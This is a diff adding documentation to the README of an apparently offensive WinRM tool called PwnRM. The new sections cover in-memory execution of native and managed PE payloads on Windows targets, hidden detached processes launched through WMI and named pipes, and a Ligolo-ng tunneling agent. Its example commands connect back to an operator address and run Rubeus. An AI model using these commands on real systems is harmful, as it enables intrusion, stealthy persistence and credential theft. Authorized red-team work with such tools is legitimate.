@@ -86,6 +86,90 @@ one accepting `string[]`. `Console.Out` and `Console.Error` are captured and
 restored in `finally`, even when the assembly throws. The input buffer is then
 cleared.
 
+## Native and managed PE execution (`!noconsolation`)
+
+`!noconsolation` accepts a PE from the operator filesystem or an HTTP(S) URL.
+Use `--remote` with an explicit `--native` or `--managed` mode when `SOURCE` is
+already a path on the Windows target:
+
+```text
+# No output capture: launch in a background runspace and return immediately.
+!noconsolation --native ligolo-agent.exe -connect 192.0.2.10:11601
+!noconsolation --managed Rubeus.exe triage
+
+# No capture, but survive closure of the PwnRM/WinRM runspace.
+!noconsolation --detached --native agent.exe -connect 192.0.2.10:11601
+
+# Opt in to foreground output capture (60-second native default timeout).
+!noconsolation --capture-output --native whoami.exe /all
+!noconsolation --capture-output --managed Rubeus.exe triage
+
+# Execute an existing target-side file without first downloading it locally.
+!noconsolation --remote --native C:\Windows\System32\whoami.exe /all
+```
+
+Output capture is intentionally opt-in. If neither `--capture-output` nor its
+`--capture` alias is specified, native execution sets No-Consolation's
+no-output option, uses no loader timeout, begins the operation in a separate
+PowerShell runspace, prints only the PwnRM background job ID, and leaves the
+payload running. Managed assemblies use the same background-by-default policy.
+The background context belongs to the current remote RunspacePool, so the
+interactive PwnRM session must remain open for a long-lived payload. Single
+command mode (`-X`) closes the pool and is therefore unsuitable for this
+session-owned default mode.
+
+`--detached` is the explicit independent-job mode. PwnRM creates a hidden
+PowerShell process through local WMI, passes the loader and payload from the
+WinRM process to that process over a random named pipe, waits only for an
+in-memory-load acknowledgement, and returns the target PID. No payload PE is
+written to the target when `SOURCE` is operator-local or an operator-fetched
+URL. The process survives closure of PwnRM's RunspacePool, but not host reboot,
+explicit process termination, or endpoint controls. It cannot be combined with
+`--capture-output`; stop the returned PID explicitly when the engagement task
+is complete.
+
+Native execution uses the upstream
+[No-Consolation](https://github.com/fortra/No-Consolation) BOF through
+[Invoke-Bof](https://github.com/airbus-cert/Invoke-Bof). PwnRM fetches pinned
+revisions in the operator process, verifies exact SHA-256 digests, patches the
+loader in memory, and stages bytes over PSRP; the target does not fetch those
+assets. Set `PWNRM_NOCONSOLATION_ASSET_DIR` to a trusted local directory
+containing `Invoke-Bof.ps1`, `NoConsolation.x64.o`, and
+`NoConsolation.x86.o` for offline operation. Operator payloads are limited to
+64 MiB by default (`PWNRM_MAX_EXEC`, maximum 512 MiB).
+
+Automatic PE inspection selects managed or native mode for operator-side
+payloads and rejects native architecture mismatch. A remote path cannot be
+inspected until execution and therefore requires an explicit mode. Native
+loader switches `--method`, `--unicode`, `--link-to-peb`, `--dont-unload`, and
+`--load-all-dependencies` are available for DLL-specific cases. In-process
+native loading can crash or corrupt the WinRM provider if the payload or its
+dependencies are incompatible; use it only in a disposable, authorized test
+context before an engagement.
+
+## Detached Ligolo-ng agent (`!ligolo`)
+
+`!ligolo` is a purpose-specific alias for detached native No-Consolation
+execution, inspired by the Sliver alias layout in
+[KriyosArcane/sliver-ligolo-ng](https://github.com/KriyosArcane/sliver-ligolo-ng).
+PwnRM does not bundle or silently download an agent: supply a Windows agent you
+built or verified yourself.
+
+```text
+# Operator-local build: transferred through PSRP and the named pipe, never
+# written as a PE on the target.
+!ligolo ./ligolo-ng-agent-windows-amd64.exe -connect 192.0.2.10:11601 -ignore-cert
+
+# Existing target-side agent (the source file is already on target disk).
+!ligolo --remote C:\ProgramData\agent.exe -connect 192.0.2.10:11601 -ignore-cert
+```
+
+The command always selects native, no-output, detached execution and prints the
+independent PowerShell PID. Ligolo arguments are forwarded unchanged. The
+proxy/listener, certificates, and network routes remain operator
+responsibilities; PwnRM only launches the agent. Use the returned PID for
+cleanup after the tunnel is stopped.
+
 ## Reverse shell (`!revshell`)
 
 The reverse shell uses native Winsock/CreateProcess imports in the remote
